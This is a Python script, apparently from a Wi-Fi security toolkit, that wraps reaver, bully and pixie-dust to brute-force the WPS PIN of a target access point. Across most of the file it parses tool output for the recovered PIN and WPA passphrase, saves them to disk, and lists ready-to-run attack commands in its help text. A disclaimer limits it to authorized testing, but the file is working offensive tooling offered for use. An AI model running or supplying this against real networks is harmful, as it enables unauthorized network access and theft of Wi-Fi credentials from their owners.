#!/usr/bin/env python3
"""
WPS Attack for Hoover WiFi Security Toolkit
WPS PIN brute force via reaver/bully/pixie-dust wrappers
For authorized security testing and research only
"""

import sys
import os
import argparse
import re
import shutil
import subprocess
import threading
import time
from datetime import datetime
from typing import Optional

from utils import validate_mac, validate_interface, check_monitor_mode, require_root, setup_logging


class WPSAttack:
    def __init__(self, interface: str, target_bssid: str,
                 channel: Optional[int] = None,
                 method: str = "reaver", timeout: int = 300,
                 pixie_dust: bool = False,
                 pin: Optional[str] = None,
                 output_dir: str = "captures") -> None:
        self.interface: str = interface
        self.target_bssid: str = target_bssid.upper()
        self.channel: Optional[int] = channel
        self.method: str = method
        self.timeout: int = timeout
        self.pixie_dust: bool = pixie_dust
        self.pin: Optional[str] = pin
        self.output_dir: str = output_dir
        self.logger = setup_logging("wps_attack")
        self._process: Optional[subprocess.Popen] = None
        self._stop_event = threading.Event()
        self._result: dict = {
            "status": "idle",
            "pin": None,
            "psk": None,
            "method": method,
            "start_time": None,
            "end_time": None,
        }

    def check_tools(self) -> dict[str, bool]:
        tools = {
            "reaver": shutil.which("reaver") is not None,
            "bully": shutil.which("bully") is not None,
            "wash": shutil.which("wash") is not None,
        }
        for name, available in tools.items():
            self.logger.info("  %s: %s", name, "found" if available else "not found")
        return tools

    def scan_wps_targets(self) -> list[dict]:
        self.logger.info("Scanning for WPS-enabled APs on %s...", self.interface)

        if not shutil.which("wash"):
            self.logger.error("wash not found. Install reaver package.")
            return []

        try:
            result = subprocess.run(
                ["wash", "-i", self.interface, "-s"],
                capture_output=True, text=True, timeout=30,
            )
            targets = []
            for line in result.stdout.strip().split("\n"):
                line = line.strip()
                if not line or line.startswith("Wash") or line.startswith("---") or line.startswith("BSSID"):
                    continue
                parts = line.split()
                if len(parts) >= 6:
                    targets.append({
                        "bssid": parts[0],
                        "channel": int(parts[1]) if parts[1].isdigit() else None,
                        "rssi": int(parts[2]) if parts[2].lstrip("-").isdigit() else None,
                        "wps_version": parts[3],
                        "wps_locked": parts[4].lower() == "yes",
                        "ssid": " ".join(parts[5:]),
                    })

            self.logger.info("Found %d WPS-enabled targets", len(targets))
            return targets

        except subprocess.TimeoutExpired:
            self.logger.warning("WPS scan timed out")
            return []
        except (FileNotFoundError, OSError) as e:
            self.logger.error("Error running wash: %s", e)
            return []

    def _run_reaver(self) -> dict:
        cmd = ["reaver", "-i", self.interface, "-b", self.target_bssid, "-vv"]
        if self.channel:
            cmd.extend(["-c", str(self.channel)])
        if self.pin:
            cmd.extend(["-p", self.pin])

        return self._run_tool(cmd, "reaver")

    def _run_bully(self) -> dict:
        cmd = ["bully", self.interface, "-b", self.target_bssid]
        if self.channel:
            cmd.extend(["-c", str(self.channel)])
        if self.pin:
            cmd.extend(["-p", self.pin])

        return self._run_tool(cmd, "bully")

    def _run_pixie_dust(self) -> dict:
        cmd = ["reaver", "-i", self.interface, "-b", self.target_bssid, "-vv", "-K", "1"]
        if self.channel:
            cmd.extend(["-c", str(self.channel)])

        return self._run_tool(cmd, "pixie-dust")

    def _run_tool(self, cmd: list, method_name: str) -> dict:
        self.logger.info("Running %s: %s", method_name, " ".join(cmd))
        result = {"status": "failed", "pin": None, "psk": None, "output": ""}

        try:
            self._process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            )

            output_lines = []
            start = time.time()

            while not self._stop_event.is_set():
                if time.time() - start > self.timeout:
                    self.logger.warning("Timeout reached (%ds)", self.timeout)
                    result["status"] = "timeout"
                    break

                if self._process.poll() is not None:
                    break

                line = self._process.stdout.readline()
                if line:
                    decoded = line.decode("utf-8", errors="replace").strip()
                    output_lines.append(decoded)
                    self.logger.debug("%s", decoded)

                    pin_match = re.search(r"WPS PIN:\s*['\"]?(\d{4,8})['\"]?", decoded)
                    if pin_match:
                        result["pin"] = pin_match.group(1)

                    psk_match = re.search(r"WPA PSK:\s*['\"]?(.+?)['\"]?\s*$", decoded)
                    if psk_match:
                        result["psk"] = psk_match.group(1)

            remaining = self._process.stdout.read()
            if remaining:
                for line in remaining.decode("utf-8", errors="replace").split("\n"):
                    line = line.strip()
                    if line:
                        output_lines.append(line)
                        pin_match = re.search(r"WPS PIN:\s*['\"]?(\d{4,8})['\"]?", line)
                        if pin_match:
                            result["pin"] = pin_match.group(1)
                        psk_match = re.search(r"WPA PSK:\s*['\"]?(.+?)['\"]?\s*$", line)
                        if psk_match:
                            result["psk"] = psk_match.group(1)

            result["output"] = "\n".join(output_lines[-50:])

            if result["pin"]:
                result["status"] = "success"
                self.logger.info("PIN found: %s", result["pin"])
                if result["psk"]:
                    self.logger.info("PSK found: %s", result["psk"])
            elif result["status"] != "timeout":
                result["status"] = "failed"

        except FileNotFoundError:
            self.logger.error("%s not found", method_name)
            result["status"] = "tool_not_found"
        except Exception as e:
            self.logger.error("Error running %s: %s", method_name, e)
            result["status"] = "error"
        finally:
            if self._process and self._process.poll() is None:
                self._process.terminate()
                try:
                    self._process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self._process.kill()

        return result

    def attack(self) -> dict:
        self._result["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._result["status"] = "running"
        self._result["method"] = self.method

        self.logger.info("Starting WPS attack on %s", self.target_bssid)
        self.logger.info("  Method: %s", self.method)
        self.logger.info("  Timeout: %ds", self.timeout)

        if self.method == "reaver":
            result = self._run_reaver()
        elif self.method == "bully":
            result = self._run_bully()
        elif self.method == "pixie-dust":
            result = self._run_pixie_dust()
        else:
            self.logger.error("Unknown method: %s", self.method)
            result = {"status": "error", "pin": None, "psk": None}

        self._result.update(result)
        self._result["end_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if result.get("pin"):
            self._save_result(result)

        return self._result

    def _save_result(self, result: dict) -> None:
        try:
            os.makedirs(self.output_dir, exist_ok=True)
            bssid_safe = self.target_bssid.replace(":", "-")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(self.output_dir, f"wps_{bssid_safe}_{timestamp}.txt")
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(f"WPS Attack Result\n")
                f.write(f"BSSID: {self.target_bssid}\n")
                f.write(f"Method: {self.method}\n")
                f.write(f"PIN: {result.get('pin', 'N/A')}\n")
                f.write(f"PSK: {result.get('psk', 'N/A')}\n")
                f.write(f"Time: {self._result.get('start_time', '')} - {self._result.get('end_time', '')}\n")
            self.logger.info("Result saved to %s", filepath)
        except Exception as e:
            self.logger.error("Failed to save result: %s", e)

    def get_status(self) -> dict:
        return dict(self._result)

    def stop(self) -> None:
        self._stop_event.set()
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._process.kill()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WPS Attack - WPS PIN brute force via reaver/bully",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Reaver attack
  sudo python3 wps_attack.py -i wlan0mon -b AA:BB:CC:DD:EE:FF

  # Pixie Dust attack
  sudo python3 wps_attack.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -m pixie-dust

  # Bully attack on specific channel
  sudo python3 wps_attack.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -m bully -ch 6

  # Test specific PIN
  sudo python3 wps_attack.py -i wlan0mon -b AA:BB:CC:DD:EE:FF --pin 12345670

Note: Requires reaver and/or bully installed.
      For authorized security testing only.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface in monitor mode")
    parser.add_argument("-b", "--bssid", required=True,
                        help="Target AP BSSID")
    parser.add_argument("-ch", "--channel", type=int,
                        help="Target AP channel")
    parser.add_argument("-m", "--method", default="reaver",
                        choices=["reaver", "bully", "pixie-dust"],
                        help="Attack method (default: reaver)")
    parser.add_argument("--pin",
                        help="Test specific WPS PIN")
    parser.add_argument("-t", "--timeout", type=int, default=300,
                        help="Attack timeout in seconds (default: 300)")
    parser.add_argument("-o", "--output-dir", default="captures",
                        help="Output directory (default: captures)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()
    require_root()

    ok, err = validate_mac(args.bssid)
    if not ok:
        logger = setup_logging("wps_attack")
        logger.error("Invalid BSSID format: %s", args.bssid)
        sys.exit(1)

    if not check_monitor_mode(args.interface):
        logger = setup_logging("wps_attack")
        logger.warning("%s may not be in monitor mode", args.interface)
        response = input("Continue anyway? (y/N): ")
        if response.lower() != "y":
            sys.exit(1)

    attacker = WPSAttack(
        interface=args.interface,
        target_bssid=args.bssid,
        channel=args.channel,
        method=args.method,
        timeout=args.timeout,
        pin=args.pin,
        output_dir=args.output_dir,
    )

    tools = attacker.check_tools()
    if args.method in ("reaver", "pixie-dust") and not tools.get("reaver"):
        print("reaver not found. Install with: apt install reaver")
        sys.exit(1)
    if args.method == "bully" and not tools.get("bully"):
        print("bully not found. Install with: apt install bully")
        sys.exit(1)

    result = attacker.attack()

    print(f"\n{'='*60}")
    print("WPS Attack Result")
    print(f"{'='*60}")
    print(f"Status:  {result['status']}")
    print(f"Method:  {result['method']}")
    if result["pin"]:
        print(f"PIN:     {result['pin']}")
    if result["psk"]:
        print(f"PSK:     {result['psk']}")

    sys.exit(0 if result["status"] == "success" else 1)


if __name__ == "__main__":
    main()
